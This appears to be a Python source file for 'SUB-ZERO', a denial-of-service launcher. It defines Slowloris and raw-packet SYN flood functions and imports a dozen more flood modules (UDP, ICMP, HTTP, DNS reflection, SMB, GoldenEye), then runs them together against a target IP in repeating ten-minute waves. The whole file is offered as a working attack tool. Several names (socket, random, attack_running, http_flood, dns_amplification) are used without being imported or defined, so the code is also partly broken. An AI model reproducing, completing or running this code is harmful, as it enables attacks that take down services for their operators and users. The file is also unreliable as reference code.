import logging
from multiprocessing import Process
import time
from plugins.zero import sub_zero

#
#                         /$$$$$$  /$$   /$$ /$$$$$$$       /$$$$$$$$ /$$$$$$$$ /$$$$$$$   /$$$$$$       
#                        /$$__  $$| $$  | $$| $$__  $$     |_____ $$ | $$_____/| $$__  $$ /$$__  $$      
#                       | $$  \__/| $$  | $$| $$  \ $$          /$$/ | $$      | $$  \ $$| $$  \ $$      
#                       |  $$$$$$ | $$  | $$| $$$$$$$  /$$$$$$ /$$/  | $$$$$   | $$$$$$$/| $$  | $$      
#                        \____  $$| $$  | $$| $$__  $$|______//$$/   | $$__/   | $$__  $$| $$  | $$      
#                        /$$  \ $$| $$  | $$| $$  \ $$       /$$/    | $$      | $$  \ $$| $$  | $$      
#                       |  $$$$$$/|  $$$$$$/| $$$$$$$/      /$$$$$$$$| $$$$$$$$| $$  | $$|  $$$$$$/      
#                        \______/  \______/ |_______/      |________/|________/|__/  |__/ \______/                          
#

logging.basicConfig(filename='logs/ice_flakes.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
def slowloris():
    logging.info("Starting Slowloris attack...")
    headers = "GET / HTTP/1.1\r\nHost: {}\r\n".format(TARGET_IP)
    while attack_running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            s.send(headers.encode())
            logging.debug(f"Slowloris: Sent header to {TARGET_IP}")
            time.sleep(5)
        except Exception as e:
            logging.error(f"Error in Slowloris attack: {e}")

def syn_flood():
    logging.info("Starting SYN Flood attack...")
    while attack_running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ip_header = b"\x45\x00\x00\x28" + random.randbytes(8)
            tcp_header = b"\x00\x50" + random.randbytes(6)
            packet = ip_header + tcp_header
            s.sendto(packet, (TARGET_IP, TARGET_PORT))
            logging.debug(f"SYN Flood: Sent packet to {TARGET_IP}")
        except Exception as e:
            logging.error(f"Error in SYN Flood attack: {e}")


from frosted_flakes.udp_flood import udp_flood
from frosted_flakes.icmp_flood import icmp_flood
from frosted_flakes.http_post_flood import http_post_flood
from frosted_flakes.dns_reflection import dns_reflection
from frosted_flakes.slow_http_post import slow_http_post
from frosted_flakes.http_cookie_flood import http_cookie_flood
from frosted_flakes.http_method_flood import http_method_flood
from frosted_flakes.smb_dos import smb_flood
from frosted_flakes.tcp_ack_flood import tcp_ack_flood
from frosted_flakes.slow_http_post_attack import slow_http_post_attack
from frosted_flakes.goldeneye import goldeneye

TARGET_IP = "192.168.1.1"  # Example target IP
TARGET_PORT = 80  # Example target port
THREADS = 20

def launch_attacks():
    while True:
        processes = []

        # Start original attacks (unchanged)
        processes.append(Process(target=slowloris))
        processes.append(Process(target=syn_flood))
        processes.append(Process(target=http_flood))
        processes.append(Process(target=dns_amplification))

        # Start new attacks (imported as modules)
        processes.append(Process(target=udp_flood, args=(TARGET_IP, TARGET_PORT)))
        processes.append(Process(target=icmp_flood, args=(TARGET_IP,)))
        processes.append(Process(target=http_post_flood, args=(TARGET_IP,)))
        processes.append(Process(target=dns_reflection, args=(TARGET_IP,)))
        processes.append(Process(target=slow_http_post, args=(TARGET_IP,)))
        processes.append(Process(target=http_cookie_flood, args=(TARGET_IP,)))
        processes.append(Process(target=http_method_flood, args=(TARGET_IP,)))
        processes.append(Process(target=smb_flood, args=(TARGET_IP,)))
        processes.append(Process(target=tcp_ack_flood, args=(TARGET_IP, TARGET_PORT)))
        processes.append(Process(target=slow_http_post_attack, args=(TARGET_IP,)))
        processes.append(Process(target=goldeneye, args=(TARGET_IP,)))


        for p in processes:
            p.start()

    
        time.sleep(600)  # Attacks run for 10 minutes

        # Terminate all processes
        for p in processes:
            p.terminate()

if __name__ == "__main__":
    sub_zero()
    logging.info("SUB-ZER0 starting  attack scripts...")
    launch_attacks()
    logging.info("SUB-ZERO  terminated.")
